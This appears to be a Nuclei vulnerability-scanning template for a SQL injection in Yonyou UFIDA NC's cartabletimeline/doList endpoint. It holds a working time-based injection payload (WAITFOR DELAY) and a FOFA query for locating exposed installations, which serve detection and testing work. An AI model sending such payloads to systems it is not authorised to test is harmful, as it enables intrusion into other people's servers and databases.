id: yonyou-nc-cartabletimeline-sqli

info:
  name: UFIDA NC cartabletimeline SQL Injection
  author: qwtd
  severity: high
  reference:
    - https://forum.butian.net/article/627
  metadata:
    fofa-query: 'app="用友-UFIDA-NC"'
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - raw:
      - |
        @timeout: 15s
        GET /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Priority: u=4

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
          - 'status_code == 200'
          - 'contains(body, "<?xml")'
        condition: and